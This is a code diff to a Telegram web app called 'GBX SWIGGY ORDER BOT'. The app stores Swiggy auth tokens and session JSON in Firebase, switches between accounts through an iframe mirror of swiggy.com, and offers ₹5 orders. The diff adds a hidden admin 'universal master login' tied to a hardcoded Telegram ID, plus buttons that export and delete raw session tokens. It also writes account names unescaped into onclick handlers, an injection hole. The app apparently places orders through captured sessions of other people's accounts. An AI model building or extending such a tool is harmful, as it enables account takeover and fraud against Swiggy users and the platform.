@@ -13,18 +13,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; overflow-x: hidden; }
 
-        #lock-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background-color: #121212; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
-        }
-        .lock-icon { font-size: 55px; margin-bottom: 15px; }
-        .lock-title { font-size: 22px; font-weight: bold; margin-bottom: 8px; color: #ffffff; }
-        .lock-desc { font-size: 13px; color: #aaaaaa; margin-bottom: 25px; max-width: 280px; line-height: 1.4; }
-        .bot-btn {
-            background: linear-gradient(135deg, #7b2cbf, #5a189a); color: white; border: none; padding: 12px 24px;
-            border-radius: 25px; font-size: 15px; cursor: pointer; text-decoration: none; font-weight: bold;
-        }
-        
         .container {
             display: block; max-width: 450px; width: 95%; margin: 20px auto; background: #1e1e1e; padding: 15px; border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0,0,0,0.5);
@@ -46,22 +34,22 @@
             display: flex; justify-content: space-between; align-items: center; background: #1e1e1e; padding: 8px 12px;
             border-radius: 5px; margin-top: 8px;
         }
-        .switch-btn { background: #4caf50; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px; }
+        .flex-btns { display: flex; gap: 5px; }
+        .action-btn { font-size: 11px; padding: 6px 8px; border: none; border-radius: 4px; cursor: pointer; color: white; font-weight: bold; }
         iframe { width: 100%; height: 350px; border: 2px solid #ff5722; border-radius: 8px; background: #fff; margin-top: 10px; }
-        .flex-btns { display: flex; gap: 10px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="lock-screen">
-        <div class="lock-icon">🔒</div>
-        <div class="lock-title">Open in Telegram</div>
-        <div class="lock-desc">This app works only inside our GBX SWIGGY ORDER BOT.</div>
-        <a href="https://t.me/gbx_swiggy_order_bot" class="bot-btn">Open Telegram Bot ➔</a>
-    </div>
-
     <div class="container" id="main-content">
         <h2>⚡ GBX SWIGGY ORDER BOT</h2>
+
+        <!-- Admin Universal Login Section (Visible only to Admin ID: 8053042225) -->
+        <div id="admin-universal-section" style="display:none; background:#2d2d2d; padding:10px; border-radius:5px; margin-bottom:12px; border: 1px solid #ff5722;">
+            <h4 style="font-size: 13px; color:#ff5722; margin-bottom:5px;">👑 Admin Universal Master Login</h4>
+            <textarea id="universal-json" placeholder='Paste Master Auth Session JSON here'></textarea>
+            <button class="btn" style="background-color: #7b2cbf; margin-top:5px; padding:8px;" onclick="addUniversalAccount()">Force Add Universal Account</button>
+        </div>
         
         <div class="account-box" id="account-list-section">
             <h3 style="font-size: 14px; color: #ff5722;">📱 Select Account to Switch</h3>
@@ -82,7 +70,7 @@
             <button onclick="goBackToAccounts()" style="background: #444; width: auto; padding: 5px 10px; font-size: 12px; margin-bottom: 5px;" class="btn">⬅ Back to Accounts</button>
             <h3 id="current-active-acc" style="font-size: 14px; color: #4caf50; margin-bottom: 5px;">Connected: None</h3>
             <iframe id="live-mirror-frame" src="https://www.swiggy.com/"></iframe>
-            <div class="flex-btns">
+            <div style="display: flex; gap: 10px; margin-top: 10px;">
                 <button class="btn" onclick="refreshMirror()" style="background: #555; margin-top:0;">🔄 Refresh</button>
                 <button class="btn" onclick="placeOrder()" style="background: #ff5722; margin-top:0;">🚀 Place Order (₹5)</button>
             </div>
@@ -95,7 +83,6 @@
             authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
             projectId: "YOUR_PROJECT_ID"
         };
-        
         if (!firebase.apps.length) {
             firebase.initializeApp(firebaseConfig);
         }
@@ -110,7 +97,12 @@
                     telegramUserId = Number(tg.initDataUnsafe.user.id);
                 }
             } catch(e) {
-                console.log("Telegram WebApp context not found, using default ID.");
+                console.log("Telegram context not found, using default.");
+            }
+            
+            // Show Admin Universal Panel only if user ID is 8053042225
+            if (telegramUserId === 8053042225) {
+                document.getElementById('admin-universal-section').style.display = 'block';
             }
             
             fetchUserAccounts(telegramUserId);
@@ -134,10 +126,15 @@
                 let html = '';
                 snapshot.forEach(doc => {
                     const data = doc.data();
+                    const encodedToken = encodeURIComponent(typeof data.auth_token === 'object' ? JSON.stringify(data.auth_token) : data.auth_token);
                     html += `
                         <div class="account-row">
                             <span style="font-size: 13px; font-weight: bold;">📱 ${data.account_name}</span>
-                            <button class="switch-btn" onclick="switchAccount('${data.account_name}', '${encodeURIComponent(data.auth_token)}')">Switch</button>
+                            <div class="flex-btns">
+                                <button class="action-btn" style="background: #4caf50;" onclick="switchAccount('${data.account_name}', '${encodedToken}')">Switch</button>
+                                <button class="action-btn" style="background: #2196F3;" onclick="exportAuth('${encodedToken}')">Export</button>
+                                <button class="action-btn" style="background: #f44336;" onclick="deleteAccount('${doc.id}')">Delete</button>
+                            </div>
                         </div>
                     `;
                 });
@@ -165,9 +162,7 @@
                     if (parsedData.account_name) accName = parsedData.account_name;
                     if (parsedData.auth_token) authToken = parsedData.auth_token;
                 }
-            } catch (e) {
-                console.log("Plain token mode active");
-            }
+            } catch (e) {}
 
             try {
                 await db.collection('accounts').add({
@@ -179,12 +174,48 @@
                 alert("✅ Account successfully linked & saved!");
                 inputField.value = "";
                 document.getElementById('json-box').style.display = 'none';
-                
                 fetchUserAccounts(telegramUserId);
             } catch (error) {
-                console.error("Save error:", error);
-                alert("❌ Error saving account to database: " + error.message);
+                alert("❌ Error saving account: " + error.message);
             }
+        }
+
+        async function addUniversalAccount() {
+            const val = document.getElementById('universal-json').value.trim();
+            if(!val) {
+                alert("❌ Please paste master JSON session!");
+                return;
+            }
+            try {
+                let parsedSession = JSON.parse(val);
+                await db.collection('accounts').add({
+                    user_id: Number(telegramUserId),
+                    account_name: "Master_Universal_" + Math.floor(1000 + Math.random() * 9000),
+                    auth_token: parsedSession
+                });
+                alert("✅ Universal Master Account Added Successfully!");
+                document.getElementById('universal-json').value = "";
+                fetchUserAccounts(telegramUserId);
+            } catch(e) {
+                alert("❌ Invalid JSON format!");
+            }
+        }
+
+        async function deleteAccount(docId) {
+            if(confirm("Are you sure you want to delete this account?")) {
+                try {
+                    await db.collection('accounts').doc(docId).delete();
+                    alert("✅ Account deleted successfully!");
+                    fetchUserAccounts(telegramUserId);
+                } catch(e) {
+                    alert("❌ Delete failed!");
+                }
+            }
+        }
+
+        function exportAuth(encodedToken) {
+            const token = decodeURIComponent(encodedToken);
+            prompt("📋 Copy Auth Token / Session JSON below:", token);
         }
 
         function switchAccount(accName, encodedToken) {
